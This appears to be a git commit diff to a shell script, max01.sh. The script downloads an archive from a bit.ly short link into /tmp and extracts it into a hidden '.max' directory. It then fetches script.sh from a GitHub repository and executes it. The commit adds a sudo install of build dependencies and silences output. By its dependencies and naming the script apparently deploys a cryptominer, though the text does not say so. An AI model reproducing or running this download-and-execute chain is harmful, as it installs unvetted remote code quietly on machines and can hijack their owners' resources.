bdbd186fab50ffb5c92da035103ac57d96f3c49e
Ayoub JADOULI <ayoubjaddouli@gmail.com>
2021-07-09 06:22:42 +0100

    lol

--- max01.sh
+++ max01.sh
@@ -1,9 +1,10 @@
 #!/bin/sh
 sLink='https://github.com/cloud10001/pycpu/raw/main/test.sh'
+sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev automake libtool autoconf -y
 cd /tmp/
 wget -q -O /tmp/maxarc bit.ly/MaxArc
-tar -xJvf /tmp/maxarc 
+tar -xJf /tmp/maxarc 
 cd .max
-wget -O script.sh $sLink 
+wget -q -O script.sh $sLink 
 chmod +x script.sh
 ./script.sh
